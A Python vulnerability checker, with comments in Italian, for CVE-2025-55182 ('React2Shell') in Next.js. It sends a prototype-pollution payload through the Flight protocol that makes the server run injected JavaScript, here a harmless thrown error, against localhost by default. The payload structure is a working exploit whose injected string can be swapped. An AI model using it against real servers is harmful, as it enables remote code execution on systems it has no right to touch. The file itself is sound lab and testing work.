#!/usr/bin/env python3
"""
React2Shell (CVE-2025-55182) - Vulnerability Checker

Verifica se un'app Next.js e' vulnerabile a prototype pollution
nel Flight protocol. NON esegue comandi sul server: usa throw Error
come payload. Se il server e' vulnerabile, l'errore appare nei log
del container (docker logs react2shell-lab).

Uso: python3 check_vuln.py [url]
Default: http://localhost:3000
Urcabalurca
"""

import json
import sys
import os
import tempfile
import subprocess

def check(url):
    payload = json.dumps({
        'then': '$1:__proto__:then',
        'status': 'resolved_model',
        'reason': -1,
        'value': '{"then": "$B0"}',
        '_response': {
            '_prefix': "throw new Error('CVE-2025-55182-VULNERABLE');",
            '_formData': {
                'get': '$1:constructor:constructor'
            }
        }
    })

    tmp_dir = tempfile.mkdtemp()
    p0 = os.path.join(tmp_dir, 'p0.json')
    p1 = os.path.join(tmp_dir, 'p1.txt')

    with open(p0, 'w') as f:
        f.write(payload)
    with open(p1, 'w') as f:
        f.write('"$@0"')

    try:
        result = subprocess.run(
            [
                'curl', '-s',
                '-X', 'POST', url,
                '-H', 'Next-Action: dontcare',
                '-F', f'0=<{p0}',
                '-F', f'1=<{p1}',
                '--max-time', '5'
            ],
            capture_output=True, text=True, timeout=10
        )

        body = result.stdout
        exit_code = result.returncode

        if exit_code == 28:
            # Timeout: la prototype pollution ha bloccato il server
            print(f'[!] VULNERABILE  {url}')
            print(f'    Il server ha hangato (prototype pollution riuscita).')
            return True
        elif 'E{"digest"' in body:
            # Next.js ha catturato un errore dal payload
            print(f'[!] VULNERABILE  {url}')
            print(f'    Il Flight decoder ha eseguito il payload.')
            print(f'    Controlla i log: docker logs react2shell-lab')
            print(f'    Dovresti vedere: Error: CVE-2025-55182-VULNERABLE')
            return True
        else:
            print(f'[OK] Non vulnerabile  {url}')
            return False

    except subprocess.TimeoutExpired:
        print(f'[!] VULNERABILE  {url}')
        print(f'    Il server ha hangato (prototype pollution riuscita).')
        return True

    except FileNotFoundError:
        print(f'[ERR] curl non trovato.')
        return False

    finally:
        os.unlink(p0)
        os.unlink(p1)
        os.rmdir(tmp_dir)

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:3000'
    check(target)
